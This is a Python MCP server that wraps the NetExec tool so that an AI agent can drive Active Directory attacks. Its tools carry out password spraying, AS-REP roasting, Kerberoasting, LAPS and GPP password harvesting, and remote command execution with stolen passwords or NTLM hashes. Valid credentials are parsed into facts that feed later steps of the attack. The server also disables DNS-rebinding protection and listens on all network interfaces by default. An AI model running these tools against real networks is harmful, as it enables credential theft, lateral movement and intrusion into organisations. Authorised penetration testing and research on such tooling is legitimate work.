"""netexec-suite MCP Server for Athena.

NetExec (CrackMapExec successor) multi-protocol AD enumeration,
password spraying, and remote execution.
Returns JSON with {"facts": [{"trait": ..., "value": ...}]}
to integrate with Athena's fact collection pipeline.
"""

import asyncio
import json
import os
import re
import tempfile

from mcp.server.fastmcp import FastMCP
from mcp.server.transport_security import TransportSecuritySettings

_security = TransportSecuritySettings(
    enable_dns_rebinding_protection=False,
)

mcp = FastMCP("athena-netexec-suite", transport_security=_security)


async def _run_command(cmd: list[str], timeout: int = 180) -> tuple[str, str, int]:
    """Run subprocess asynchronously with timeout."""
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return "", "Command timed out", -1
    return (
        stdout.decode(errors="replace"),
        stderr.decode(errors="replace"),
        proc.returncode or 0,
    )


_NXC_SUCCESS = re.compile(r"\[\+\]")
_NXC_PWNED = re.compile(r"\(Pwn3d!\)")


@mcp.tool()
async def netexec_smb_enum(
    target: str,
    username: str = "",
    password: str = "",
    domain: str = "",
) -> str:
    """SMB enumeration: OS version, shares, logged-in users, GPP passwords.

    Args:
        target: IP address, CIDR range, or hostname
        username: Username (empty for null session)
        password: Password (empty for null session)
        domain: AD domain name

    Returns:
        JSON with facts: ad.smb_host, ad.smb_share, ad.smb_user, ad.gpp_password
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = ["nxc", "smb", target]
        if username:
            cmd.extend(["-u", username])
        if password:
            cmd.extend(["-p", password])
        if domain:
            cmd.extend(["-d", domain])
        cmd.extend(["--shares", "--users", "--sessions"])

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        for line in combined.splitlines():
            stripped = line.strip()

            if "SMB" in stripped and re.search(r"\d+\.\d+\.\d+\.\d+", stripped):
                facts.append({"trait": "ad.smb_host", "value": stripped[:200]})

            if re.search(r"(READ|WRITE)", stripped, re.IGNORECASE):
                share_match = re.match(r".*?\s+([\w$]+)\s+(READ|WRITE)", stripped, re.IGNORECASE)
                if share_match:
                    facts.append({
                        "trait": "ad.smb_share",
                        "value": f"{share_match.group(1)} ({share_match.group(2)})",
                    })

            if _NXC_SUCCESS.search(stripped):
                user_match = re.search(r"(\w+\\[\w.]+)", stripped)
                if user_match:
                    facts.append({"trait": "ad.smb_user", "value": user_match.group(1)})

            if "GPP" in stripped or "cpassword" in stripped.lower():
                facts.append({"trait": "ad.gpp_password", "value": stripped[:200]})

        return json.dumps({"facts": facts, "raw_output": combined[:4000]})

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def netexec_password_spray(
    target: str,
    username_list: str,
    password: str,
    domain: str,
    protocol: str = "smb",
    password_list: str = "",
) -> str:
    """Password spraying attack (supports SMB/LDAP/WinRM).

    Args:
        target: Target IP or CIDR
        username_list: Comma-separated usernames or path to file
        password: Single password to spray (use password_list for multiple)
        password_list: Comma-separated passwords to try (overrides password)
        domain: AD domain name
        protocol: Protocol to use (smb, ldap, winrm)

    Returns:
        JSON with facts: credential.valid_pair, ad.sprayed_account
    """
    facts: list[dict[str, str]] = []
    all_output: list[str] = []

    passwords = [p.strip() for p in password_list.split(",") if p.strip()] if password_list else [password]
    usernames = [u.strip() for u in username_list.split(",") if u.strip()] if "," in username_list else [username_list]

    # Write usernames to a temp file — multiple -u flags only keep the last entry in nxc
    user_file = None
    try:
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("\n".join(usernames))
            user_file = f.name

        for pw in passwords:
            cmd = ["nxc", protocol, target, "-d", domain, "-u", user_file, "-p", pw, "--continue-on-success"]

            stdout, stderr, rc = await _run_command(cmd, timeout=300)
            combined = stdout + stderr
            all_output.append(combined)

            for line in combined.splitlines():
                stripped = line.strip()
                if _NXC_SUCCESS.search(stripped):
                    # Match DOMAIN\username — stop at colon or space to avoid duplicating password
                    cred_match = re.search(r"\[\+\]\s+([\w.]+)\\([\w.@-]+)(?::|$|\s)", stripped)
                    if cred_match:
                        domain_part = cred_match.group(1)
                        user_part = cred_match.group(2)
                        facts.append({
                            "trait": "credential.valid_pair",
                            "value": f"{domain_part}\\{user_part}:{pw}",
                        })
                        facts.append({"trait": "ad.sprayed_account", "value": user_part})

                    if _NXC_PWNED.search(stripped):
                        facts.append({"trait": "credential.valid_pair", "value": f"ADMIN_ACCESS:{stripped[:200]}"})

        merged_output = "\n---\n".join(all_output)
        return json.dumps({"facts": facts, "raw_output": merged_output[:4000]})

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })
    finally:
        if user_file and os.path.exists(user_file):
            os.unlink(user_file)


@mcp.tool()
async def netexec_ldap_enum(
    target: str,
    username: str,
    password: str,
    domain: str,
) -> str:
    """LDAP deep enumeration: AS-REP Roastable, Kerberoastable, LAPS passwords.

    Args:
        target: DC IP or hostname
        username: Domain username
        password: Domain password
        domain: AD domain name

    Returns:
        JSON with facts: ad.asreproast_user, ad.kerberoastable_user, ad.laps_password
    """
    facts: list[dict[str, str]] = []

    try:
        # AS-REP Roasting
        cmd_asrep = [
            "nxc", "ldap", target,
            "-u", username, "-p", password, "-d", domain,
            "--asreproast", "/tmp/asrep_hashes.txt",
        ]
        stdout1, stderr1, _ = await _run_command(cmd_asrep)
        for line in (stdout1 + stderr1).splitlines():
            if "ASREP" in line.upper() or "$krb5asrep$" in line:
                user_match = re.search(r"(\w+)\s+.*ASREP", line, re.IGNORECASE)
                if user_match:
                    facts.append({"trait": "ad.asreproast_user", "value": user_match.group(1)})

        # Kerberoasting
        cmd_kerb = [
            "nxc", "ldap", target,
            "-u", username, "-p", password, "-d", domain,
            "--kerberoasting", "/tmp/kerb_hashes.txt",
        ]
        stdout2, stderr2, _ = await _run_command(cmd_kerb)
        for line in (stdout2 + stderr2).splitlines():
            if "SPN" in line.upper() or "$krb5tgs$" in line:
                user_match = re.search(r"(\w+)\s+.*SPN", line, re.IGNORECASE)
                if user_match:
                    facts.append({"trait": "ad.kerberoastable_user", "value": user_match.group(1)})

        # LAPS
        cmd_laps = [
            "nxc", "ldap", target,
            "-u", username, "-p", password, "-d", domain,
            "-M", "laps",
        ]
        stdout3, stderr3, _ = await _run_command(cmd_laps)
        for line in (stdout3 + stderr3).splitlines():
            if "LAPS" in line.upper() and _NXC_SUCCESS.search(line):
                facts.append({"trait": "ad.laps_password", "value": line.strip()[:200]})

        combined = stdout1 + stderr1 + stdout2 + stderr2 + stdout3 + stderr3
        return json.dumps({"facts": facts, "raw_output": combined[:4000]})

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def netexec_exec(
    target: str,
    username: str,
    password_or_hash: str,
    domain: str = "",
    command: str = "whoami",
    method: str = "smbexec",
) -> str:
    """Remote command execution via SMBExec/WMIExec/PSExec.

    Args:
        target: Target IP or hostname
        username: Username
        password_or_hash: Password or NTLM hash (LM:NT format)
        domain: AD domain name
        command: Command to execute
        method: Execution method (smbexec, wmiexec, atexec)

    Returns:
        JSON with facts: lateral.session, credential.shell
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = ["nxc", "smb", target]
        if domain:
            cmd.extend(["-d", domain])
        cmd.extend(["-u", username])

        if re.match(r"^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$", password_or_hash):
            cmd.extend(["-H", password_or_hash])
        else:
            cmd.extend(["-p", password_or_hash])

        cmd.extend(["-x", command, "--exec-method", method])

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        if _NXC_PWNED.search(combined) or rc == 0:
            facts.append({"trait": "lateral.session", "value": f"{method}://{username}@{target}"})
            facts.append({"trait": "credential.shell", "value": f"{target} via {method}"})

        return json.dumps({"facts": facts, "raw_output": combined[:4000]})

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def netexec_spn_enum(
    target: str,
    username: str,
    password: str,
    domain: str,
) -> str:
    """SPN enumeration + service account detection.

    Args:
        target: DC IP or hostname
        username: Domain username
        password: Domain password
        domain: AD domain name

    Returns:
        JSON with facts: ad.spn_account, ad.service_ticket
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = [
            "nxc", "ldap", target,
            "-u", username, "-p", password, "-d", domain,
            "--spns",
        ]

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        for line in combined.splitlines():
            stripped = line.strip()
            spn_match = re.search(r"(\w+/[\w.:-]+)", stripped)
            if spn_match:
                facts.append({"trait": "ad.spn_account", "value": spn_match.group(1)})

            if "$krb5tgs$" in stripped:
                facts.append({
                    "trait": "ad.service_ticket",
                    "value": stripped[:120] + "..." if len(stripped) > 120 else stripped,
                })

        return json.dumps({"facts": facts, "raw_output": combined[:4000]})

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--transport",
        default="stdio",
        choices=["stdio", "sse", "streamable-http"],
    )
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    mcp.settings.host = args.host
    mcp.settings.port = args.port
    mcp.run(transport=args.transport)
